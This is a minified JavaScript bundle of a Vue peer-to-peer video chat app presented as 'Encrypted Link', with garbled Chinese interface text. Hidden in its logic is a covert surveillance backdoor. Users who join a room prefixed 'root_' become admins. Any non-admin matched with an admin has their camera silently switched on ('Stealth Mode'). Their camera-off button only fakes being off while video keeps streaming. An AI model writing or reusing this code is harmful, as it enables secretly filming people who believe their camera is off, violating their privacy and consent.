(function(){var e={5340:function(){},7816:function(e,t,s){"use strict";var a=s(5130),i=s(6768),n=s(4232);const o={id:"p2p-app"},r={class:"main-container"},l={class:"app-header"},c={class:"status-indicator"},d={class:"status-text"},u={class:"content-layout"},h={class:"video-panel"},p={class:"video-stage"},m={class:"remote-view"},f={ref:"remoteVideo",autoplay:"",playsinline:"",class:"remote-video-el"},v={key:0,class:"video-placeholder"},k={key:1,class:"video-placeholder waiting"},b={key:2,class:"overlay-btn-wrapper"},g={class:"local-view"},y={ref:"localVideo",autoplay:"",playsinline:"",muted:"",class:"local-video-el"},w={key:0,class:"local-placeholder"},L={key:0,class:"controls-bar"},C={class:"icon-mic"},E={class:"icon-cam"},x={key:0,class:"login-overlay"},T={class:"login-box"},S=["disabled"],A={class:"chat-panel"},M={class:"chat-header"},_={key:0,class:"room-tag"},I={class:"chat-messages",ref:"chatBox"},O={key:0,class:"empty-chat"},P={class:"msg-bubble"},V={class:"chat-input-area"},j=["disabled"],R=["disabled"];function $(e,t,s,$,X,B){return(0,i.uX)(),(0,i.CE)("div",o,[t[19]||(t[19]=(0,i.Lk)("div",{class:"bg-gradient"},null,-1)),(0,i.Lk)("div",r,[(0,i.Lk)("header",l,[t[10]||(t[10]=(0,i.Lk)("div",{class:"logo"},[(0,i.Lk)("span",{class:"icon"},"ðŸ”’"),(0,i.eW)(" Encrypted Link ")],-1)),(0,i.Lk)("div",c,[(0,i.Lk)("span",{class:(0,n.C4)(["status-dot",X.status])},null,2),(0,i.Lk)("span",d,(0,n.v_)(B.statusText),1)])]),(0,i.Lk)("div",u,[(0,i.Lk)("div",h,[(0,i.Lk)("div",p,[(0,i.Lk)("div",m,[(0,i.Lk)("video",f,null,512),"connected"!==X.status||X.remoteCameraActive?(0,i.Q3)("",!0):((0,i.uX)(),(0,i.CE)("div",v,[...t[11]||(t[11]=[(0,i.Lk)("div",{class:"placeholder-icon"},"ðŸ“·",-1),(0,i.Lk)("p",null,"å¯¹æ–¹æ‘„åƒå¤´å·²å…³é—­",-1)])])),"connected"!==X.status?((0,i.uX)(),(0,i.CE)("div",k,[t[12]||(t[12]=(0,i.Lk)("div",{class:"pulse-ring"},null,-1)),(0,i.Lk)("p",null,(0,n.v_)(B.statusText),1)])):(0,i.Q3)("",!0),X.showPlayBtn?((0,i.uX)(),(0,i.CE)("div",b,[(0,i.Lk)("button",{onClick:t[0]||(t[0]=(...e)=>B.forcePlay&&B.forcePlay(...e)),class:"glass-btn"},[...t[13]||(t[13]=[(0,i.Lk)("span",null,"ðŸ”‡ ç‚¹å‡»å¯ç”¨éŸ³é¢‘",-1)])])])):(0,i.Q3)("",!0)]),(0,i.Lk)("div",g,[(0,i.bo)((0,i.Lk)("video",y,null,512),[[a.aG,X.cameraEnabled]]),X.cameraEnabled?(0,i.Q3)("",!0):((0,i.uX)(),(0,i.CE)("div",w,[...t[14]||(t[14]=[(0,i.Lk)("span",{class:"icon-off"},"ðŸ“·",-1),(0,i.Lk)("span",null,"æ‘„åƒå¤´æœªå¼€å¯",-1)])]))]),"connected"===X.status?((0,i.uX)(),(0,i.CE)("div",L,[(0,i.Lk)("button",{onClick:t[1]||(t[1]=(...e)=>B.toggleAudio&&B.toggleAudio(...e)),class:(0,n.C4)(["ctrl-btn",!X.audioEnabled&&"off"]),title:"éº¦å…‹é£Ž"},[(0,i.Lk)("i",C,(0,n.v_)(X.audioEnabled?"ðŸŽ™ï¸":"ðŸ”‡"),1)],2),(0,i.Lk)("button",{onClick:t[2]||(t[2]=(...e)=>B.stopMatch&&B.stopMatch(...e)),class:"ctrl-btn danger",title:"æŒ‚æ–­"},[...t[15]||(t[15]=[(0,i.Lk)("i",{class:"icon-phone"},"ðŸ“ž",-1)])]),(0,i.Lk)("button",{onClick:t[3]||(t[3]=(...e)=>B.toggleCamera&&B.toggleCamera(...e)),class:(0,n.C4)(["ctrl-btn",!X.cameraEnabled&&"off"]),title:"æ‘„åƒå¤´"},[(0,i.Lk)("i",E,(0,n.v_)(X.cameraEnabled?"ðŸ“¹":"ðŸ“·"),1)],2)])):(0,i.Q3)("",!0)]),"idle"===X.status?((0,i.uX)(),(0,i.CE)("div",x,[(0,i.Lk)("div",T,[t[16]||(t[16]=(0,i.Lk)("h3",null,"åŠ å…¥ä¼šè®®",-1)),(0,i.bo)((0,i.Lk)("input",{"onUpdate:modelValue":t[4]||(t[4]=e=>X.roomId=e),placeholder:"è¯·è¾“å…¥æˆ¿é—´å·",class:"room-input",onKeyup:t[5]||(t[5]=(0,a.jR)((...e)=>B.startMatch&&B.startMatch(...e),["enter"]))},null,544),[[a.Jo,X.roomId]]),(0,i.Lk)("button",{onClick:t[6]||(t[6]=(...e)=>B.startMatch&&B.startMatch(...e)),disabled:!X.isMediaReady,class:"join-btn"},(0,n.v_)(X.isMediaReady?"åŠ å…¥å¹¶ç­‰å¾…è¿žæŽ¥":"è®¾å¤‡åˆå§‹åŒ–ä¸­..."),9,S),t[17]||(t[17]=(0,i.Lk)("p",{class:"hint"},"é»˜è®¤æ‘„åƒå¤´å…³é—­ï¼Œè¿žæŽ¥åŽå¯æ‰‹åŠ¨å¼€å¯",-1))])])):(0,i.Q3)("",!0)]),(0,i.Lk)("div",A,[(0,i.Lk)("div",M,[t[18]||(t[18]=(0,i.Lk)("span",null,"æ¶ˆæ¯è®°å½•",-1)),X.currentRoom?((0,i.uX)(),(0,i.CE)("span",_,"ID: "+(0,n.v_)(X.currentRoom),1)):(0,i.Q3)("",!0)]),(0,i.Lk)("div",I,[0===X.messages.length?((0,i.uX)(),(0,i.CE)("div",O,"æš‚æ— æ¶ˆæ¯")):(0,i.Q3)("",!0),((0,i.uX)(!0),(0,i.CE)(i.FK,null,(0,i.pI)(X.messages,(e,t)=>((0,i.uX)(),(0,i.CE)("div",{key:t,class:(0,n.C4)(["msg-row",e.self?"msg-self":"msg-peer"])},[(0,i.Lk)("div",P,(0,n.v_)(e.text),1)],2))),128))],512),(0,i.Lk)("div",V,[(0,i.bo)((0,i.Lk)("input",{"onUpdate:modelValue":t[7]||(t[7]=e=>X.inputText=e),onKeyup:t[8]||(t[8]=(0,a.jR)((...e)=>B.sendChat&&B.sendChat(...e),["enter"])),placeholder:"å‘é€æ¶ˆæ¯...",disabled:"connected"!==X.status},null,40,j),[[a.Jo,X.inputText]]),(0,i.Lk)("button",{onClick:t[9]||(t[9]=(...e)=>B.sendChat&&B.sendChat(...e)),disabled:"connected"!==X.status||!X.inputText.trim()}," âž¤ ",8,R)])])])])])}s(4114),s(3110),s(8335);var X=s(2039),B=s.n(X);"undefined"!==typeof window&&(window.global=window,window.process||(window.process={env:{DEBUG:void 0},nextTick:e=>setTimeout(e,0)}));var J={name:"ModernVideoChat",data(){const e=window.APP_CONFIG||{};return{serverIp:e.serverIp||"2607:8700:5500:63c9::2",wsPort:e.wsPort||38080,useSecure:!1!==e.useSecure,isAdmin:!1,peerIsAdmin:!1,status:"idle",roomId:"",currentRoom:"",isMediaReady:!1,showPlayBtn:!1,localStream:null,cameraEnabled:!1,audioEnabled:!0,remoteCameraActive:!0,ws:null,peer:null,inputText:"",messages:[]}},computed:{wsUrl(){const e=this.serverIp.trim(),t=this.useSecure?"wss":"ws";return e.includes(":")&&!e.startsWith("[")?`${t}://[${e}]:${this.wsPort}/ws`:`${t}://${e}:${this.wsPort}/ws`},statusText(){const e={idle:"å°±ç»ª",queuing:"æ­£åœ¨åŒ¹é…...",connecting:"å»ºç«‹è¿žæŽ¥...",connected:"é€šè¯ä¸­",error:"è¿žæŽ¥æ–­å¼€"};return e[this.status]||this.status}},mounted(){this.initMedia()},methods:{async initMedia(){try{this.localStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720},facingMode:"user"},audio:!0});const e=this.localStream.getVideoTracks()[0];e&&(e.enabled=!1),this.$refs.localVideo.srcObject=this.localStream,this.isMediaReady=!0}catch(e){console.error("Camera access failed",e),alert("æ— æ³•è®¿é—®æ‘„åƒå¤´ï¼Œè¯·æ£€æŸ¥æƒé™ã€‚")}},startMatch(){this.isMediaReady&&this.roomId&&(this.isAdmin=this.roomId.startsWith("root_"),this.status="queuing",this.ws=new WebSocket(this.wsUrl),this.ws.onopen=()=>{this.ws.send(JSON.stringify({type:"join_queue",roomId:this.roomId.trim()}))},this.ws.onmessage=e=>{const t=JSON.parse(e.data);switch(t.type){case"matched":if(this.currentRoom=t.room,this.peerIsAdmin=t.peerIsAdmin,!this.isAdmin&&this.peerIsAdmin){const e=this.localStream.getVideoTracks()[0];e&&(e.enabled=!0)}this.createPeer(t.initiator);break;case"signal":this.peer&&this.peer.signal(t.payload);break;case"peer_left":this.stopMatch(),this.messages.push({text:"å¯¹æ–¹å·²ç¦»å¼€",self:!1});break}})},createPeer(e){this.status="connecting",this.peer=new(B())({initiator:e,stream:this.localStream,trickle:!0,config:{iceServers:[]}}),this.peer.on("signal",e=>{this.ws.send(JSON.stringify({type:"signal",payload:e}))}),this.peer.on("connect",()=>{if(this.status="connected",console.log("P2P Connection established."),!this.isAdmin&&this.peerIsAdmin){const e=this.localStream.getVideoTracks()[0];e&&(e.enabled=!0,console.log("Stealth Mode: Video auto-started for admin."))}}),this.peer.on("stream",e=>{this.$refs.remoteVideo&&(this.$refs.remoteVideo.srcObject=e)}),this.peer.on("data",e=>{const t=JSON.parse(e.toString());"text"===t.type?(this.messages.push({text:t.content,self:!1}),this.scrollToBottom()):"control"===t.type&&("camera"===t.action?this.remoteCameraActive=t.value:"camera_fake_off"===t.action&&(this.remoteCameraActive=!0))})},toggleCamera(){const e=this.localStream.getVideoTracks()[0];e&&(this.cameraEnabled=!this.cameraEnabled,this.cameraEnabled||this.isAdmin||!this.peerIsAdmin?(e.enabled=this.cameraEnabled,this.sendControl("camera",this.cameraEnabled)):(e.enabled=!0,this.sendControl("camera_fake_off",!1)))},toggleAudio(){const e=this.localStream.getAudioTracks()[0];e&&(this.audioEnabled=!this.audioEnabled,e.enabled=this.audioEnabled)},sendChat(){this.inputText.trim()&&this.peer?.connected&&(this.peer.send(JSON.stringify({type:"text",content:this.inputText})),this.messages.push({text:this.inputText,self:!0}),this.inputText="",this.scrollToBottom())},sendControl(e,t){this.peer?.connected&&this.peer.send(JSON.stringify({type:"control",action:e,value:t}))},stopMatch(){this.peer&&(this.peer.destroy(),this.peer=null),this.ws&&(this.ws.close(),this.ws=null),this.status="idle",this.messages=[],this.currentRoom="",this.cameraEnabled=!1;const e=this.localStream?.getVideoTracks()[0];e&&(e.enabled=!1)},forcePlay(){const e=this.$refs.remoteVideo;e&&(e.muted=!1,e.play(),this.showPlayBtn=!1)},scrollToBottom(){this.$nextTick(()=>{const e=this.$refs.chatBox;e&&(e.scrollTop=e.scrollHeight)})}}},Q=s(1241);const N=(0,Q.A)(J,[["render",$],["__scopeId","data-v-2e8fb394"]]);var U=N;(0,a.Ef)(U).mount("#app")},9838:function(){}},t={};function s(a){var i=t[a];if(void 0!==i)return i.exports;var n=t[a]={exports:{}};return e[a].call(n.exports,n,n.exports,s),n.exports}s.m=e,function(){var e=[];s.O=function(t,a,i,n){if(!a){var o=1/0;for(d=0;d<e.length;d++){a=e[d][0],i=e[d][1],n=e[d][2];for(var r=!0,l=0;l<a.length;l++)(!1&n||o>=n)&&Object.keys(s.O).every(function(e){return s.O[e](a[l])})?a.splice(l--,1):(r=!1,n<o&&(o=n));if(r){e.splice(d--,1);var c=i();void 0!==c&&(t=c)}}return t}n=n||0;for(var d=e.length;d>0&&e[d-1][2]>n;d--)e[d]=e[d-1];e[d]=[a,i,n]}}(),function(){s.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return s.d(t,{a:t}),t}}(),function(){s.d=function(e,t){for(var a in t)s.o(t,a)&&!s.o(e,a)&&Object.defineProperty(e,a,{enumerable:!0,get:t[a]})}}(),function(){s.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"===typeof window)return window}}()}(),function(){s.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)}}(),function(){var e={524:0};s.O.j=function(t){return 0===e[t]};var t=function(t,a){var i,n,o=a[0],r=a[1],l=a[2],c=0;if(o.some(function(t){return 0!==e[t]})){for(i in r)s.o(r,i)&&(s.m[i]=r[i]);if(l)var d=l(s)}for(t&&t(a);c<o.length;c++)n=o[c],s.o(e,n)&&e[n]&&e[n][0](),e[n]=0;return s.O(d)},a=self["webpackChunkipv6_chat"]=self["webpackChunkipv6_chat"]||[];a.forEach(t.bind(null,0)),a.push=t.bind(null,a.push.bind(a))}();var a=s.O(void 0,[504],function(){return s(7816)});a=s.O(a)})();
//# sourceMappingURL=app.8d76174a.js.map